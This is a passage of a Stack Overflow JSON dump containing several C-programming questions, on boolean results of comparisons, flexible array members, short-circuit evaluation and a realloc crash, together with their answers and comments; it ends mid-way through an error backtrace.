"https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1461784820, "post_id": 36898935, "comment_id": 61362137, "body": "same reason as why C require main function requires main function to return 0 on normal exit: convention."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461785043, "post_id": 36898935, "comment_id": 61362292, "body": "They don&#39;t necessarily. The <code>is....()</code> family returns non-0."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1461785661, "post_id": 36898935, "comment_id": 61362673, "body": "@user3528438 but that is <code>0</code> in your case meaning &quot;true&quot;. For abnormal exit <code>main</code> can return any non-0 value that can be trapped by the caller, for example a batch file can use <code>errorlevel</code>."}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1461786020, "post_id": 36898935, "comment_id": 61362899, "body": "There&#39;s no conditional expression in this code. Your <code>==</code> expression has type <code>int</code>, and it has well-defined semantics. In particular, it does <i>not</i> &quot;evaluate to true&quot;. That&#39;s just something you made up."}], "answers": [{"tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": false, "score": 3, "last_activity_date": 1461784871, "last_edit_date": 1592644375, "creation_date": 1461784871, "answer_id": 36899057, "question_id": 36898935, "link": "https://stackoverflow.com/questions/36898935/expressions-in-c-return-1-for-true/36899057#36899057", "title": "Expressions in c return 1 for true", "body": "<p>This is defined in the C standard:</p>\n<blockquote>\n<p><strong>6.5.13 Logical AND operator</strong></p>\n<p>The &amp;&amp; operator shall yield 1 if both of its operands compare unequal to 0; otherwise, it yields 0.  The result has type int.</p>\n</blockquote>\n<p>Similar for the other logical operators.</p>\n<p>It makes a lot of sense to have a deterministic value for these cases, and the lowest positive non-zero value is a good candidate for that.</p>\n"}, {"tags": [], "owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "is_accepted": false, "score": 3, "last_activity_date": 1461784972, "creation_date": 1461784972, "answer_id": 36899088, "question_id": 36898935, "link": "https://stackoverflow.com/questions/36898935/expressions-in-c-return-1-for-true/36899088#36899088", "title": "Expressions in c return 1 for true", "body": "<p><a href=\"https://docs.google.com/viewer?url=www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf&amp;pli=1\" rel=\"nofollow\">C11 draft</a></p>\n\n<p><strong>6.5.9 Equality operators</strong>\n3</p>\n\n<blockquote>\n  <p>The == (equal to) and != (not equal to) operators are analogous to the\n  relational operators except for their lower precedence.108) Each of\n  the operators yields 1 if the specified relation is true and 0 if it\n  is false. The result has type int. For any pair of operands, exactly\n  one of the relations is true.</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461785102, "post_id": 36899094, "comment_id": 61362334, "body": "I think it&#39;s more by definition. <code>(a==a)</code> evaluates to <code>1</code>."}], "tags": [], "owner": {"reputation": 11, "user_id": 6108770, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/42d863aa3d9d56177540f07d309df9b3?s=128&d=identicon&r=PG&f=1", "display_name": "ilmarchese", "link": "https://stackoverflow.com/users/6108770/ilmarchese"}, "is_accepted": false, "score": 0, "last_activity_date": 1461786303, "last_edit_date": 1461786303, "creation_date": 1461784993, "answer_id": 36899094, "question_id": 36898935, "link": "https://stackoverflow.com/questions/36898935/expressions-in-c-return-1-for-true/36899094#36899094", "title": "Expressions in c return 1 for true", "body": "<p>Because as you said, evaluating the both sides of that kind of expressions, the result could be true or false, that is a boolean value. By definition and convetion, in C standard, boolean values are represented with a 1 for true and 0 for false.</p>\n"}], "owner": {"reputation": 39, "user_id": 6263281, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-ZpxYfuspfSw/AAAAAAAAAAI/AAAAAAAAAAA/2tprSALj_kA/photo.jpg?sz=128", "display_name": "Comp Lovr", "link": "https://stackoverflow.com/users/6263281/comp-lovr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 168, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1462021355, "creation_date": 1461784526, "question_id": 36898935, "link": "https://stackoverflow.com/questions/36898935/expressions-in-c-return-1-for-true", "title": "Expressions in c return 1 for true", "body": "<p>In c programming ,all non zero numbers can be used in conditional expressions to return true. In that aspect why do expressions which evaluate to true return 1 ,not any other non zero value?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    printf(\"%d\",6==6);\n}\n</code></pre>\n\n<p>output: 1</p>\n"}, {"tags": ["c", "arrays", "static", "structure", "flexible-array-member"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1461784503, "post_id": 36898856, "comment_id": 61361927, "body": "If your &quot;compiler hits you with 26 errors&quot;, maybe you should try compiling something simpler first?"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1461784722, "post_id": 36898856, "comment_id": 61362083, "body": "I suspect you need to allocate some <code>char</code>s for the card names. In <code>struct card</code>, try changing from <code>char name[]</code> to <code>char name[16]</code>"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1461785170, "post_id": 36898856, "comment_id": 61362376, "body": "Or you can try <code>const char *name</code>."}], "answers": [{"tags": [], "owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "is_accepted": true, "score": 2, "last_activity_date": 1461785282, "creation_date": 1461785282, "answer_id": 36899175, "question_id": 36898856, "link": "https://stackoverflow.com/questions/36898856/c-programming-non-static-initialization-of-a-flexible-array-member/36899175#36899175", "title": "C Programming - Non static initialization of a flexible array member", "body": "<p>You need to create some space for the name of each card.  Easiest way to do this would be to change your <code>struct card</code> definition to something like:</p>\n\n<pre><code>struct card\n{\n  int value;\n  char name[16];  // doesn't have to be 16, but make sure it's large enough to hold each card name plus a '\\0' terminator\n};\n</code></pre>\n"}], "owner": {"reputation": 95, "user_id": 6053642, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c4fcfa95753b6ab5c9ce0948dab9c3d7?s=128&d=identicon&r=PG&f=1", "display_name": "NoAbL", "link": "https://stackoverflow.com/users/6053642/noabl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 906, "favorite_count": 0, "accepted_answer_id": 36899175, "answer_count": 1, "score": 0, "last_activity_date": 1461785282, "creation_date": 1461784274, "question_id": 36898856, "link": "https://stackoverflow.com/questions/36898856/c-programming-non-static-initialization-of-a-flexible-array-member", "title": "C Programming - Non static initialization of a flexible array member", "body": "<p>I think my english is just to bad to understand the other articles about this. But anyway:</p>\n\n<p>I just thought i could write a program (in C), that can store a set of cards.\nNot complicated, just store values and names of cards and print them out. \nI'm a beginner in C, and because i'm in the section \"Strings in Structures\" in my Book, i wanted to try out structures on my own. This is my Code so far:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct card\n{\n    int value;\n    char name[];\n};\n\nint main(void)\n{\n    const struct card heart[13] = { {2,\"two\"}, {3,\"three\"}, {4,\"four\"}, {5,\"five\"}, {6,\"six\"}, {7,\"seven\"}, {8,\"eight\"}, {9,\"nine\"}, {10,\"ten\"}, {11,\"jack\"}, {12,\"queen\"}, {13,\"king\"}, {14,\"ace\"} };\n    int i;\n\n    for (i = 0; i &lt; 13; ++i)\n    {\n        printf(\"The card heart-%s has the value of %i\", heart[i].name, heart[i].value);\n    }\n\nreturn 0;\n</code></pre>\n\n<p>}</p>\n\n<p>I just wanted to test if it works, so i just wrote the heart-cards in the code. If i want to compile this file, my compiler (gcc/mingw) hits me with 26 errors. It says: \n\"(near initialization of heart[0])\"\n\"non static initialization of a flexible array member\"\nI don't really understand this. In the book, everything works as expected. I tried to rebuild the code in the book and changing the names, but it doesn't work. I think it's a problem with the strings, because if i use integers only, everything works. \nIn already read in another post, that every string should be allocated manually, and there was a code example, but i don't know what all the lines should mean, and i want understand what my code does, so i don't copy + paste. </p>\n\n<p>Could you explain me why this doesn't work?\nPS: I am writing currently in windows, so please don't use bash commands to explain or something like that.\nI am also german and my english is not the \"yellow of the egg\", try to explain without using complex 'sentence builds' (i hope you know what i mean :D) and unusual words.</p>\n\n<p>Thanks for all help!</p>\n"}, {"tags": ["c", "if-statement", "recursion"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1461783690, "post_id": 36898615, "comment_id": 61361426, "body": "This has nothing to do with optimization. The evaluation semantics of if statements are a fundamental part of the core language rules."}, {"owner": {"reputation": 8218, "user_id": 2615940, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/9a6Qc.jpg?s=128&g=1", "display_name": "skrrgwasme", "link": "https://stackoverflow.com/users/2615940/skrrgwasme"}, "edited": false, "score": 0, "creation_date": 1461783818, "post_id": 36898615, "comment_id": 61361514, "body": "This isn&#39;t a duplicate, and it&#39;s not asking about short-circuit evaluation. It&#39;s asking about recursive comparisons of multiple structure fields when those fields aren&#39;t explicitly specified."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1461783827, "post_id": 36898615, "comment_id": 61361518, "body": "It has nothing to do with <code>if</code> statement, but rather with evaluation of logical operators. The answer would be applicable in any context."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "edited": false, "score": 0, "creation_date": 1461784905, "post_id": 36898615, "comment_id": 61362194, "body": "<code>if(a == NULL &amp;&amp; b == NULL) return 0;</code> contains a logical error."}, {"owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1461786131, "post_id": 36898615, "comment_id": 61362962, "body": "@KerrekSB Eh, it happens to everyone. It shouldn&#39;t too often though."}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 6263193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/787c3910597599e18c501035b683d0dc?s=128&d=identicon&r=PG&f=1", "display_name": "Sukrit Chopra", "link": "https://stackoverflow.com/users/6263193/sukrit-chopra"}, "edited": false, "score": 1, "creation_date": 1462300108, "post_id": 36898665, "comment_id": 61575437, "body": "Awesome. Thank You!!!"}, {"owner": {"reputation": 36528, "user_id": 471164, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/45d4a7ba0fb8e789356f5da87536444d?s=128&d=identicon&r=PG", "display_name": "vitaut", "link": "https://stackoverflow.com/users/471164/vitaut"}, "reply_to_user": {"reputation": 7, "user_id": 6263193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/787c3910597599e18c501035b683d0dc?s=128&d=identicon&r=PG&f=1", "display_name": "Sukrit Chopra", "link": "https://stackoverflow.com/users/6263193/sukrit-chopra"}, "edited": false, "score": 0, "creation_date": 1462303443, "post_id": 36898665, "comment_id": 61577459, "body": "Sure. Don&#39;t forget to accept this or another answer if it answers your question. ;-)"}], "tags": [], "owner": {"reputation": 36528, "user_id": 471164, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/45d4a7ba0fb8e789356f5da87536444d?s=128&d=identicon&r=PG", "display_name": "vitaut", "link": "https://stackoverflow.com/users/471164/vitaut"}, "is_accepted": true, "score": 2, "last_activity_date": 1461783602, "creation_date": 1461783602, "answer_id": 36898665, "question_id": 36898615, "link": "https://stackoverflow.com/questions/36898615/is-if-statement-optimized-to-not-call-recursive-functions-if-first-condition-is/36898665#36898665", "title": "Is if statement optimized to not call recursive functions if first condition is false?", "body": "<p>C uses <a href=\"https://en.wikipedia.org/wiki/Short-circuit_evaluation\" rel=\"nofollow\">short-circuit evaluation</a>, so <code>fun(a-&gt;left)</code> and other functions on the right-hand side of <code>&amp;&amp;</code> won't be called if <code>a-&gt;data == b-&gt;data</code> evaluates to false.</p>\n"}, {"tags": [], "owner": {"reputation": 8218, "user_id": 2615940, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/9a6Qc.jpg?s=128&g=1", "display_name": "skrrgwasme", "link": "https://stackoverflow.com/users/2615940/skrrgwasme"}, "is_accepted": false, "score": 0, "last_activity_date": 1461784016, "last_edit_date": 1461784016, "creation_date": 1461783704, "answer_id": 36898696, "question_id": 36898615, "link": "https://stackoverflow.com/questions/36898615/is-if-statement-optimized-to-not-call-recursive-functions-if-first-condition-is/36898696#36898696", "title": "Is if statement optimized to not call recursive functions if first condition is false?", "body": "<p>No. The comparison will <em>only</em> be made for the items you specify. You would need to create a function to do a recursive comparison on your nodes, or to compare multiple fields within your node structure.</p>\n\n<pre><code>int nodes_equal(node* a, node* b){\n\n    if ((a-&gt;data != b-&gt;data) || (a-&gt;left != b-&gt;left) || (a-&gt;right != b-&gt;right))\n        return 0;\n\n    return 1;\n}\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 6263193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/787c3910597599e18c501035b683d0dc?s=128&d=identicon&r=PG&f=1", "display_name": "Sukrit Chopra", "link": "https://stackoverflow.com/users/6263193/sukrit-chopra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "closed_date": 1462506214, "accepted_answer_id": 36898665, "answer_count": 2, "score": -2, "last_activity_date": 1461784858, "creation_date": 1461783475, "last_edit_date": 1461784858, "question_id": 36898615, "link": "https://stackoverflow.com/questions/36898615/is-if-statement-optimized-to-not-call-recursive-functions-if-first-condition-is", "closed_reason": "Duplicate", "title": "Is if statement optimized to not call recursive functions if first condition is false?", "body": "<p>Consider the scenario:</p>\n\n<pre><code>int fun(node* a, node* b){\n    if(a == NULL &amp;&amp; b == NULL) return 0;\n    if( (a-&gt;data == b-&gt;data) &amp;&amp; (fun(a-&gt;left) == fun(b-&gt;left)) &amp;&amp; (fun(a-&gt;right) == fun(b-&gt;right)) return 1;\n    return 0;\n}\n</code></pre>\n\n<p>If we met a condition like if <code>a-&gt;data != b-&gt;data</code>, then will the recursive call be made to <code>(fun(a-&gt;left) == fun(b-&gt;left))</code> and <code>(fun(a-&gt;right) == fun(b-&gt;right))</code> or will it directly say false for the condition?</p>\n"}, {"tags": ["c", "dynamic", "realloc"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1461783386, "post_id": 36898413, "comment_id": 61361241, "body": "Have you checked to see what size you are passing to <code>realloc</code> when it fails?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1461783582, "post_id": 36898413, "comment_id": 61361361, "body": "How did you determine <code>realloc()</code> failed?  Returning <code>NULL</code> does <i>not</i> certainly mean it failed.  <code>realloc()</code> can return <code>NULL</code> on a 0 allocation as well as out-of-memory,"}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1461783601, "post_id": 36898413, "comment_id": 61361371, "body": "you shouldn&#39;t call realloc this way.  you are overwriting list when realloc fails, and you&#39;ve lost the original pointer."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461783810, "post_id": 36898413, "comment_id": 61361507, "body": "<code>swap(animal* this, animal* that)</code> is quite long.  Could simply use <code>void swap(animal* this, animal* that) { animal tmp = *this; *this = *that; *that = tmp; }</code>."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461783929, "post_id": 36898413, "comment_id": 61361576, "body": "<code>scanf(&quot; %s&quot;, to_search);</code> is as bad as <code>gets(to_search)</code>.  Use <code>scanf(&quot;%24s&quot;, to_search);</code>  Have any 25 letter names? IOWs, post your input."}], "answers": [{"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1461798563, "post_id": 36898900, "comment_id": 61368991, "body": "It is worth mentioning that you set yourself up for a memory leak by not using a <code>tmp</code> variable to assign the return of <code>realloc</code> before validating success. If <code>realloc</code> fails, it returns <code>NULL</code> and you have lost the ability to <code>free</code> the block of memory originally pointed to by <code>list</code>."}], "tags": [], "owner": {"reputation": 24488, "user_id": 4082723, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/LJbVr.png?s=128&g=1", "display_name": "2501", "link": "https://stackoverflow.com/users/4082723/2501"}, "is_accepted": false, "score": 2, "last_activity_date": 1461784414, "creation_date": 1461784414, "answer_id": 36898900, "question_id": 36898413, "link": "https://stackoverflow.com/questions/36898413/realloc-fails-on-shrink/36898900#36898900", "title": "realloc fails on shrink", "body": "<p>Variables are passed by value in C. </p>\n\n<p>The pointer <code>list</code> passed to function <code>del</code> is changed by realloc in the function, but the pointer outside the function isn't changed. The caused undefined behavior.</p>\n\n<p>Pointer <code>animal_list</code>, is passed here:</p>\n\n<pre><code>del(animal_list, num_animals);    \n</code></pre>\n\n<p>the copy of that pointer <code>list</code>, is changed here:</p>\n\n<pre><code>list = realloc(list, sizeof(animal) * (size - 1));\n</code></pre>\n\n<p>The original pointer <code>animal_list</code> remains unchanged.</p>\n\n<p>To solve this return the value of the new pointer list.</p>\n"}, {"tags": [], "owner": {"reputation": 75, "user_id": 5233567, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/790fca75ef7b9d4f5d3243231fb31f2f?s=128&d=identicon&r=PG&f=1", "display_name": "destrovel", "link": "https://stackoverflow.com/users/5233567/destrovel"}, "is_accepted": true, "score": 0, "last_activity_date": 1461795871, "creation_date": 1461795871, "answer_id": 36902012, "question_id": 36898413, "link": "https://stackoverflow.com/questions/36898413/realloc-fails-on-shrink/36902012#36902012", "title": "realloc fails on shrink", "body": "<p>Figured it out. <code>swap(to_delete, &amp;list[size])</code> </p>\n\n<p>just needed to be <code>swap(to_delete, &amp;list[size - 1])</code></p>\n\n<p>Hurray for stupid mistakes</p>\n"}], "owner": {"reputation": 75, "user_id": 5233567, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/790fca75ef7b9d4f5d3243231fb31f2f?s=128&d=identicon&r=PG&f=1", "display_name": "destrovel", "link": "https://stackoverflow.com/users/5233567/destrovel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "accepted_answer_id": 36902012, "answer_count": 2, "score": 1, "last_activity_date": 1461795871, "creation_date": 1461782927, "last_edit_date": 1461795153, "question_id": 36898413, "link": "https://stackoverflow.com/questions/36898413/realloc-fails-on-shrink", "title": "realloc fails on shrink", "body": "<p>Im not sure if im missing something here, but realloc() is failing with invalid size when i attempt to shrink a dynamic array of structs. ive trimmed the non-essential functions from the code to post:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar const file_name[] = \"animals.dat\";\ntypedef enum { \n    false, true } bool;\ntypedef struct {\n    char month;\n    char day;\n    short year;\n} date;\ntypedef struct {\n    bool parvo_vacc;\n    bool fip_vacc;\n    bool rabies_vacc;\n    bool has_mc;\n    bool worm_vacc;\n} md_history;\ntypedef struct {\n    int id;\n    char age;\n    char name[25];\n    char description[50];\n    md_history medical;\n    date intake_date;\n    date adopt_date;\n} animal;\nvoid lookup(animal* list, int size);\nint compare(const void* this, const void* that);\nvoid sort(animal* list, int size);\n//this brings the new name back with it, since it isnt saved correctly\n//in the new animal\nanimal* add(char* name);\nvoid del(animal* list, int size);\nvoid print_results(animal** results, int size);\nvoid print_animal(animal* print);\nvoid swap(animal* this, animal* that);\nint main(int argc, char **argv)\n{\n    FILE* readfile = fopen(file_name, \"r\");\n    if (readfile == NULL)\n    {\n        printf(\"Error file not found: %s\\n\", file_name);\n    }\n    //read data using fread(), keeping track of the number\n    //of bytes missed\n    int num_animals = 0;\n    fread(&amp;num_animals, sizeof(int), 1, readfile);\n    animal* animal_list = (animal*) calloc(num_animals, sizeof(animal));\n    int errnum = num_animals - (fread(animal_list, \n        sizeof(animal), num_animals, readfile));\n    if (errnum &gt; 0)\n    {\n        printf(\"Read encountered %d errors\", errnum);\n    }\n    fclose(readfile);\n    char c;\n    char* name = malloc(sizeof(char) * 25);\n    //switch statements dont allow declarations for whatever reason\n    int x;\n    while(c != 'q')\n    {\n        printf(\"Options: (l)ookup (s)ort (a)dd (d)elete (p)rint (q)uit (e)dit\\n\");\n        scanf(\" %c\", &amp;c);\n        switch (c)\n        {\n            case 'l':\n            lookup(animal_list, num_animals);\n            break;\n            case 's':\n            sort(animal_list, num_animals);\n            break;\n            case 'p':\n            for (x = 0; x &lt; num_animals; x++)\n            {\n                print_animal(&amp;animal_list[x]);\n            }\n            break;\n            case 'a':\n            //after dealing with lots of iostream errors trying to\n            //set the name field in add(), i decided to just return\n            //the new name to here and strcpy it\n            animal_list = realloc(animal_list, sizeof(animal) * (num_animals + 1));\n            swap(&amp;animal_list[num_animals], add(name));\n            strcpy(animal_list[num_animals].name, name);\n            num_animals++;\n            //memory leak here, since switch statements dont allow\n            //declarations, i cant save the new animal pointer to a temp\n            //var so it can be deleted\n            break;\n            case 'd':\n            del(animal_list, num_animals);\n            num_animals--;\n            break;\n        }\n    }\n    return 0;\n}\n\nvoid swap(animal* this, animal* that)\n{\n    animal temp;\n    temp.id = this-&gt;id;\n    strcpy(temp.name, this-&gt;name);\n    temp.age = this-&gt;age;\n    strcpy(temp.description, this-&gt;description);\n    temp.medical.fip_vacc = this-&gt;medical.fip_vacc;\n    temp.medical.has_mc = this-&gt;medical.has_mc;\n    temp.medical.parvo_vacc = this-&gt;medical.parvo_vacc;\n    temp.medical.rabies_vacc = this-&gt;medical.rabies_vacc;\n    temp.medical.worm_vacc = this-&gt;medical.worm_vacc;\n    temp.intake_date.day = this-&gt;intake_date.day;\n    temp.intake_date.month = this-&gt;intake_date.month;\n    temp.intake_date.year = this-&gt;intake_date.year;\n    temp.adopt_date.day = this-&gt;adopt_date.day;\n    temp.adopt_date.month = this-&gt;adopt_date.month;\n    temp.adopt_date.year = this-&gt;adopt_date.year;\n\n    this-&gt;id = that-&gt;id;\n    strcpy(this-&gt;name, that-&gt;name);\n    this-&gt;age = that-&gt;age;\n    strcpy(this-&gt;description, that-&gt;description);\n    this-&gt;medical.fip_vacc = that-&gt;medical.fip_vacc;\n    this-&gt;medical.has_mc = that-&gt;medical.has_mc;\n    this-&gt;medical.parvo_vacc = that-&gt;medical.parvo_vacc;\n    this-&gt;medical.rabies_vacc = that-&gt;medical.rabies_vacc;\n    this-&gt;medical.worm_vacc = that-&gt;medical.worm_vacc;\n    this-&gt;intake_date.day = that-&gt;intake_date.day;\n    this-&gt;intake_date.month = that-&gt;intake_date.month;\n    this-&gt;intake_date.year = that-&gt;intake_date.year;\n    this-&gt;adopt_date.day = that-&gt;adopt_date.day;\n    this-&gt;adopt_date.month = that-&gt;adopt_date.month;\n    this-&gt;adopt_date.year = that-&gt;adopt_date.year;\n\n    that-&gt;id = temp.id;\n    strcpy(that-&gt;name, temp.name);\n    that-&gt;age = temp.age;\n    strcpy(that-&gt;description, temp.description);\n    that-&gt;medical.fip_vacc = temp.medical.fip_vacc;\n    that-&gt;medical.has_mc = temp.medical.has_mc;\n    that-&gt;medical.parvo_vacc = temp.medical.parvo_vacc;\n    that-&gt;medical.rabies_vacc = temp.medical.rabies_vacc;\n    that-&gt;medical.worm_vacc = temp.medical.worm_vacc;\n    that-&gt;intake_date.day = temp.intake_date.day;\n    that-&gt;intake_date.month = temp.intake_date.month;\n    that-&gt;intake_date.year = temp.intake_date.year;\n    that-&gt;adopt_date.day = temp.adopt_date.day;\n    that-&gt;adopt_date.month = temp.adopt_date.month;\n    that-&gt;adopt_date.year = temp.adopt_date.year;\n}\n\nvoid del(animal* list, int size)\n{\n    printf(\"Delete by: (n)ame (i)d\\n\");\n    char c;\n    while (getchar() != '\\n');\n    scanf(\"%c\", &amp;c);\n    animal* to_delete = NULL;\n    if (c == 'n')\n    {\n        printf(\"Enter name to delete: \");\n        char to_search[25];\n        while (getchar() != '\\n');\n        scanf(\" %s\", to_search);\n        int x;\n        for (x = 0; x &lt; size; x++)\n        {\n            if (strcmp(to_search, list[x].name) == 0)\n            {\n                to_delete = &amp;list[x];\n            }\n        }\n    }\n    if (c == 'i')\n    {\n        printf(\"Enter ID to delete: \");\n        int to_search;\n        while (getchar() != '\\n');\n        scanf(\"%d\", &amp;to_search);\n        int x;\n        for (x = 0; x &lt; size; x++)\n        {\n            if (to_search == list[x].id)\n            {\n                to_delete = &amp;list[x];\n            }\n        }\n    }\n    swap(to_delete, &amp;list[size);\n    list = realloc(list, sizeof(animal) * (size - 1)); //fails right here\n}\n</code></pre>\n\n<p>am i shrinking the array incorrectly? im pretty stumped here</p>\n\n<p>EDIT: I know realloc() fails because it does so spectacularly and aborts, giving this message:</p>\n\n<pre><code>*** Error in `./final': realloc(): invalid next size: 0x0000000000c11250 ***\n======= Backtrace: 